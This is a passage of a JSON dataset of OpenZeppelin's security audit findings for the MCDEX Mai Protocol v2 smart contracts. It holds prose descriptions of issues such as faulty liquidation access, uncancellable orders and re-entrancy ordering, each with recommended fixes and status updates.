      "content": "Whenever the [`UpdatePositionAccount` event](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L20) is emitted, the `perpetualTotalSize` parameter is set to the size of the `LONG` position, regardless of which side was updated. Although the two sides should eventually balance, the event is often emitted while they are still unbalanced:\n\n\n* when it is emitted [the first time during a trade](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L252), the second position has not been updated, so the two sides will differ by the trade amount.\n* when it is emitted [the first time during a liquidation](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L273), the liquidators position has not been updated, so the two sides will differ by the liquidation amount.\n* when it is emitted [during settlement](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L135), the positions are closed in an arbitrary order, so the two sides may have different sizes.\n\n\nConsider emitting the total size of the relevant position, instead of defaulting to the `LONG` size, which is often incorrect.\n\n\n**Update:** *Partially fixed. The [`liquidate` function](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/perpetual/MarginAccount.sol#L320) no longer emits an `UpdatePositionAccount` event. The remaining events now emit the total size of the relevant position.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11411",
      "title": "[M09] Changes to lotSize and tradingLotSize should be atomic",
      "impact": "MEDIUM",
      "content": "As discussed in issues [M01](#m01) and [M06](#m06), `tradingLotSize` and `lotSize` depend on each other, and [cannot be changed such that `tradingLotSize % lotSize != 0`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L61-L69).\n\n\nFor these two dependent parameters, consider creating some function that changes both atomically.\n\n\n**Update:** *Acknowledged.*",
      "summary": "\nThis bug report is about two parameters, `tradingLotSize` and `lotSize`, that depend on each other and cannot be changed such that `tradingLotSize % lotSize != 0`. The suggestion is to create some function that changes both of these parameters atomically. This has been acknowledged by the development team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11410",
      "title": "[M08] wfrac function returns unintended value in edge case",
      "impact": "MEDIUM",
      "content": "The [`wfrac` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L81) in the `LibMathSigned` library is intended to return `x * y / z`. However, in the case of `(x, y, z) = (1, _INT256_MIN, -1)`, the intended result will not be returned. This is because [`_INT256_MIN`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L6) has a higher absolute value than the maximum representable `int256` value, due to the way numbers are encoded in [twos complement format](https://en.wikipedia.org/wiki/Two%27s_complement).\n\n\nWhen `t` equals `_INT256_MIN` and [`z` is less than `0`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L83), the [negation of `t`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L85) will return the same value as `t`, `_INT256_MIN`.\n\n\nTo avoid this issue, consider replacing the [implicit negation of `t`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L85) with the call `t.neg()`. The [`neg` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L13) will revert when called with `_INT256_MIN`. Consider also applying this to the [implicit negation of `z`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L84).\n\n\n**Update:** *Fixed. The recommended changes have been applied.*",
      "summary": "\nA bug was discovered in the `wfrac` function of the `LibMathSigned` library. This function is intended to return `x * y / z` when given `(x, y, z)`, however, when `(x, y, z) = (1, _INT256_MIN, -1)`, the intended result is not returned. This is because the absolute value of `_INT256_MIN` is higher than the maximum representable `int256` value due to the way numbers are encoded in twos complement format.\n\nTo fix this issue, the implicit negation of `t` and `z` were replaced with the call `t.neg()`. The `neg` function will revert when called with `_INT256_MIN`, thus avoiding the issue. These changes have been applied and the bug has been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11409",
      "title": "[M07] Undocumented Solidity assembly block",
      "impact": "MEDIUM",
      "content": "The [`hashOrder` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibOrder.sol#L86) uses assembly to hash an `Order` object. Although implemented correctly, the use of assembly discards several important safety features of Solidity, which may render the code unsafe or more error-prone. It is also harder for readers to parse, for reviewers to verify, and for developers to update.\n\n\nConsider using `abi.encode` to achieve the same functionality. Alternatively, if the efficiency of assembly is required, consider commenting each line, including the magic constants. Additionally, the current pattern accesses unrelated memory locations and introduces low-level assumptions, such as the struct not being allocated below address 32. These should be thoroughly documented.\n\n\n**Update:** *Fixed. The assembly block has been commented.*",
      "summary": "\nThe `hashOrder` function in the mai-protocol-v2 repository uses assembly to hash an `Order` object. This implementation is correct, but it discards several important safety features of Solidity which could make the code unsafe or more error-prone. It is also difficult for readers to parse and for reviewers to verify, and it is hard for developers to update.\n\nAs an alternative, it is suggested to use `abi.encode` to achieve the same functionality. If the efficiency of assembly is required, it is recommended to comment each line, including the magic constants. Furthermore, the current pattern accesses unrelated memory locations and introduces low-level assumptions, such as the struct not being allocated below address 32. These should be thoroughly documented.\n\nThe issue has been fixed and the assembly block has been commented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11408",
      "title": "[M06] Governance parameter changes should not be instant",
      "impact": "MEDIUM",
      "content": "Many sensitive changes can be made by any account with the [`WhitelistAdmin` role](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fe8f4e93bd1d4f5cc9a6899d7f24f5ffe4c14aa/contracts/access/roles/WhitelistAdminRole.sol#L21-L24) via the functions `setGovernanceParameter` within the [`AMMGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMMGovernance.sol#L22) and [`PerpetualGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L39) contracts. For example, the `WhitelistAdmin` can change the [fee schedule](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L57-L60), the [initial](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L40-L44) and [maintenance](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L45-L50) margin rates, or the [lot size parameters](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L61-L69), and these new parameters instantly take effect in the protocol with important effects.\n\n\nFor example, raising the maintenance margin rate could cause [`isSafe`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L243) to [return `False`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L251-L252) when it would have previously returned `True`. This would allow the users position [to be liquidated](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L272). By changing `tradingLotSize`, trades may [revert](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L63) when being matched, where they would not have before the change. These are only examples; the complexity of the protocol, combined with unpredictable market conditions and user actions means that many other negative effects likely exist as well.\n\n\nSince these changes are occasionally needed, but can create risk for the users of the protocol, consider implementing a time-lock mechanism for such changes to take place. By having a delay between the signal of intent and the actual change, users will have time to remove their funds or close trades that would otherwise be at risk if the change happened instantly. A simple timelock can follow the same pattern as applying for withdrawals ([setting](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L62) an `appliedHeight`, then [checking it when the withdrawal is executed](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L71)). If a timelock is implemented for governance parameter changes, the delay should be on the order of multiple days, to give users time to consider the effects of potential changes and act accordingly.\n\n\n**Update:** *Acknowledged. The Monte Carlo team will implement a delay in the external governance mechanism.*",
      "summary": "\nThis bug report concerns the [`WhitelistAdmin` role](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fe8f4e93bd1d4f5cc9a6899d7f24f5ffe4c14aa/contracts/access/roles/WhitelistAdminRole.sol#L21-L24) in the [`AMMGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMMGovernance.sol#L22) and [`PerpetualGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L39) contracts. This role is able to make changes to the fee schedule, margin rates, and lot size parameters, which can have a significant impact on the protocol and its users. The bug report suggests that a time-lock mechanism be implemented, so that users have time to respond to any changes before they take effect. This would give users the chance to remove their funds or close trades that may be at risk. The Monte Carlo team has acknowledged the suggestion and will implement a delay in the external governance mechanism.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11407",
      "title": "[M05] Incomplete Denial of Service prevention",
      "impact": "MEDIUM",
      "content": "As described in the [documentation](https://mcdex.io/references/#/en/perpetual?id=broker-amp-withdraw-time-lock), the purpose of the broker and withdraw time locks is to prevent traders nullifying trades that have already been submitted. If this were possible, it would not only disrupt their counterpartys trade, it may also revert unrelated trades if they are processed in batches. The time locks ensure the order book has time to respond to a trader that attempts to withdraw excess collateral or make trades through the AMM or another broker. However, we have identified two other scenarios that would allow the trader to nullify their trade.\n\n\nFirstly, if the trader [applied to withdraw](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L123), they could [set their `appliedBalance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L61) to a large amount. Subsequently, when a trade is processed, `claimDevFee` will ensure [the available margin can cover any opening fee](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L205-L206). However, the available margin calculation [does not respect the time lock](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L91), so a large `appliedBalance` can be used immediately to nullify the trade. Consider updating [`availableMarginWithPrice`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L88) to check the traders [`appliedHeight`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibTypes.sol#L43) before processing the `appliedBalance`.\n\n\nSecondly, a [trader can directly cancel their order](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L181). This should immediately prevent it being processed, which would nullify the trade directly. Consider preventing traders from cancelling their request directly, and instead rely on their broker to relay the cancellation.\n\n\n**Note:** This issue is related to [C02](#c02) and any mitigation should consider both issues simultaneously.\n\n\n**Update:** *Fixed with notable change to functionality. The entire timelock mechanism for brokers and withdrawals has been removed. This means there is no protection against a user nullifying a trade that was submitted to the offline order book. Importantly, this does not lead to inconsistencies within the protocol. Additionally, users can no longer choose an arbitrary broker address  they must use an address [approved](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/global/GlobalConfig.sol#L39) by the administrator (or the AMM).*",
      "summary": "\nMcDex.io is a decentralized exchange platform built on the Ethereum blockchain. The purpose of the broker and withdraw time locks is to prevent traders from nullifying trades that have already been submitted. However, two scenarios were identified that would allow the trader to nullify their trade. Firstly, if the trader applied to withdraw, they could set their appliedBalance to a large amount. This would allow them to nullify the trade as the available margin calculation does not respect the time lock. Secondly, a trader can directly cancel their order which would nullify the trade directly.\n\nTo fix this issue, the timelock mechanism for brokers and withdrawals has been removed. This means there is no protection against a user nullifying a trade that was submitted to the offline order book. Additionally, users can no longer choose an arbitrary broker address  they must use an address approved by the administrator (or the AMM).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11406",
      "title": "[M04] Missing docstrings and comments",
      "impact": "MEDIUM",
      "content": "Most of the contracts and functions in the audited code base lack documentation. This hinders reviewers understanding of the codes intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\nAdditionally, the OpenZeppelin team found a notable lack of comments throughout the audited code. Well-commented code not only improves audit speed and depth, but it also helps to reveal what developer intentions may be and thus helps identify issues of misalignment between intention and implementation. Without comments, identifying issues in the code is much more difficult. Aside from benefiting auditors, code comments also benefit future developers and users, by clearly defining the functionality of the code and by reducing the risk of bugs.\n\n\nConsider thoroughly commenting the existing code, and adding regular commenting to the software development process. We specifically recommend commenting every line of assembly code and commenting all complex math operations.\n\n\n**Update:** *Fixed. Many parts of the codebase have been documented and commented.*",
      "summary": "\nThis bug report is about the lack of documentation and comments in the audited code base. This lack of documentation and comments makes it difficult for reviewers to understand the code's intention and hinders their ability to assess the security and correctness of the code. To solve this issue, the OpenZeppelin team recommends thoroughly documenting all functions (and their parameters) that are part of the contracts' public API, as well as functions implementing sensitive functionality, even if not public. Additionally, they recommend thoroughly commenting the existing code, and adding regular commenting to the software development process. This should include commenting every line of assembly code and commenting all complex math operations. The bug report has since been fixed, with many parts of the codebase now documented and commented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11405",
      "title": "[M03] Re-entrancy possibilities",
      "impact": "MEDIUM",
      "content": "[Solidity recommends the usage of the Check-Effects-Interaction Pattern](https://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) to avoid potential security issues, such as reentrancy. However, there are several examples of interactions preceding effects:\n\n\n* In the `deposit` function of the `Collateral` contract, [collateral is retrieved](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L51) before [the user balance is updated and an event is emitted](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L54-L56).\n* In the `_withdraw` function of the `Collateral` contract, [collateral is sent](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L81-L85) before the [event is emitted](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L86)\n* The same pattern occurs in the [`depositToInsuranceFund`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L180), [`depositEtherToInsuranceFund`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L192) and [`withdrawFromInsuranceFund`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L204) functions of the `Perpetual` contract.\n\n\nIt should be noted that even when a correctly implemented ERC20 contract is used for collateral, incoming and outgoing transfers could execute arbitrary code if the contract is also ERC777 compliant. These re-entrancy opportunities are unlikely to corrupt the internal state of the system, but they would effect the order and contents of emitted events, which could confuse external clients about the state of the system. Consider always following the Check-Effects-Interactions pattern.\n\n\n**Update:** *Fixed. The [`ReentrancyGuard`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/utils/ReentrancyGuard.sol) contract is now used to protect those functions.*",
      "summary": "\nThis bug report is about the potential security issues caused by not following the Check-Effects-Interactions Pattern in Solidity. This pattern is recommended by Solidity to avoid reentrancy, which could lead to potential security issues. Examples of interactions preceding effects were found in the `deposit`, `_withdraw`, `depositToInsuranceFund`, `depositEtherToInsuranceFund`, and `withdrawFromInsuranceFund` functions of the `Collateral` and `Perpetual` contracts. Even when a correctly implemented ERC20 contract is used for collateral, incoming and outgoing transfers could execute arbitrary code if the contract is also ERC777 compliant, which could confuse external clients about the state of the system.\n\nTo fix this bug, the ReentrancyGuard contract was used to protect the functions mentioned above. This contract prevents reentrancy by using a mutex lock and ensuring that any function calls are completed before the lock is released. This ensures that the order and contents of emitted events is not affected and external clients can accurately determine the state of the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11404",
      "title": "[M02] Unspecified parameters",
      "impact": "MEDIUM",
      "content": "When a user liquidates another position, they [specify the maximum position amount to liquidate](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L291). However, the [liquidation price](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L274) and [position side](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L267) is inferred contextually from the current mark price and the state of the target account. These values could change before the liquidation is confirmed, particularly during periods of high Ethereum congestion. In many cases the liquidator would accept any successful liquidation, but for the sake of predictability, consider allowing the liquidator to specify an acceptable price range, the side of the positions to liquidate and a deadline for when the liquidation attempt expires.\n\n\nSimilarly, when [creating the AMM pool](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L162), [adding liquidity](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L267) or [removing liquidity](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L288), the price is inferred contextually. In the case of adding or removing liquidity, it could even change based on the actions of other users in the same block. Consider allowing the user to specify an acceptable price range and a deadline for when the action expires.\n\n\n**Update:** *Acknowledged. The Monte Carlo team have decided not to address this issue.*",
      "summary": "\nThis bug report is about the maximum position amount to liquidate when a user liquidates another position and the liquidation price and position side that is inferred contextually from the current mark price and the state of the target account. It also discusses the price that is inferred contextually when creating an AMM pool, adding liquidity, or removing liquidity. The bug report suggests that the user should be allowed to specify an acceptable price range and a deadline for when the action expires. This would make the liquidation and other actions more predictable. However, the Monte Carlo team have decided not to address this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11403",
      "title": "[M01] liquidateFrom does not use tradingLotSize",
      "impact": "MEDIUM",
      "content": "In the `Perpetual` contract, within the function `liquidateFrom` there is a check that the [`maxAmount` to be liquidated is a multiple of `lotSize`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L271). This [may be the amount](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L279) of some users position that gets liquidated by the end of the function call.\n\n\nHowever, all trades which happen during a call to `matchOrders` [must be for an amount that is a multiple of `tradingLotSize`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L63). This is the only way to trade with other users. Otherwise, trading with the AMM is also limited through checks [in `buyFrom`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L183) and [`sellFrom`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L225) such that the user can only trade amounts that are a multiple of `tradingLotSize`.\n\n\nIn the `PerpetualGovernance` contract, we can see that [`tradingLotSize` must be a multiple of `lotSize`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L61-L69). If these two numbers differ, and a user is liquidated for an amount not divisible by `tradingLotSize`, they may have a left-over position that is not an even multiple of `tradingLotSize`. If this occurs, they may not be able to close their position completely.\n\n\nConsider restricting liquidation amounts to multiples of `tradingLotSize`, rather than `lotSize`. Alternatively, consider providing a method for liquidated traders to close their positions that are of less than `tradingLotSize`.\n\n\n**Update:** *Acknowledged. Typically, `lotSize` and `tradingLotSize` will be the same value, but `tradingLotSize` might be increased to help with high Ethereum congestion.*",
      "summary": "\nThis bug report concerns the Perpetual contract within the Mai Protocol v2. It explains that when a user is liquidated, the amount must be a multiple of the lotSize. However, when a user trades with other users, the amount must be a multiple of the tradingLotSize. If these two values are different, and a user is liquidated for an amount not divisible by tradingLotSize, they may have a left-over position that is not an even multiple of tradingLotSize, making it impossible for the user to close their position completely.\n\nThe report suggests that either liquidation amounts should be restricted to multiples of tradingLotSize, or a method should be provided for liquidated traders to close their positions that are of less than tradingLotSize. An update to the report acknowledges that lotSize and tradingLotSize are typically the same value, but tradingLotSize might be increased to help with high Ethereum congestion.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11402",
      "title": "[H01] Incorrect social loss",
      "impact": "HIGH",
      "content": "When a bankrupt position is liquidated and the insurance fund is empty, the [opponent position holders should cover the loss](https://mcdex.io/references/#/en/perpetual?id=auto-liquidation). In this way, the profits on one side are garnished to fund the loss on the other side. This ensures the system as a whole cannot become insolvent. However, the loss is [actually attributed to positions on the same side](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L290). In the worst case, none of the positions on the same side will be able to cover the loss, which means the contract will be underfunded and some profits will not be redeemable. Consider updating the code to assign losses to the opposite side of the liquidation.\n\n\n**Update:** *Fixed.*",
      "summary": "\nThis bug report is about a bug in the code of the Mcdex.io platform. The bug occurs when a bankrupt position is liquidated and the insurance fund is empty. In this case, the losses are attributed to positions on the same side, which can lead to the contract being underfunded. This means that some profits will not be redeemable. To fix this issue, the code should be updated to assign losses to the opposite side of the liquidation. The bug has now been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11401",
      "title": "[C02] Orders cannot be cancelled",
      "impact": "HIGH",
      "content": "When a user or broker calls [`cancelOrder`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L180), [the `cancelled` mapping](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L184) is updated, but this has no subsequent effects. In particular, [`validateOrderParam`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L155) does not check if the order has been cancelled.\n\n\nConsider adding this check to the order validation to ensure cancelled orders cannot be filled.\n\n\n**Update:** *Fixed. The validation now checks the cancellation status.*",
      "summary": "\nThis bug report is about the [`cancelOrder`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L180) function on the [`mcdexio`](https://github.com/mcdexio/mai-protocol-v2) platform. When this function is called, the [`cancelled` mapping](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L184) is updated, but this had no subsequent effects. The [`validateOrderParam`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L155) function did not check if the order had been cancelled, which could lead to cancelled orders being filled.\n\nThe bug has now been fixed. The validation now checks the cancellation status to ensure cancelled orders cannot be filled.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11400",
      "title": "[C01] Anyone can liquidate on behalf of another account",
      "impact": "HIGH",
      "content": "The `Perpetual` contract has a [public `liquidateFrom` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L270) that bypasses the checks in the [`liquidate` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L291).\n\n\nThis means that it can be called to liquidate a position when the contract is in the `SETTLED` state. Additionally, any user can set an arbitrary `from` address, causing a third-party user to confiscate the under-collateralized traders position. This means that any trader can unilaterally rearrange another accounts position. They could also liquidate on behalf of the [Perpetual Proxy](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/proxy/PerpetualProxy.sol), which could break some of the [Automated Market Maker](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol) invariants, such as the condition that it only holds `LONG` positions.\n\n\nConsider restricting `liquidateFrom` to 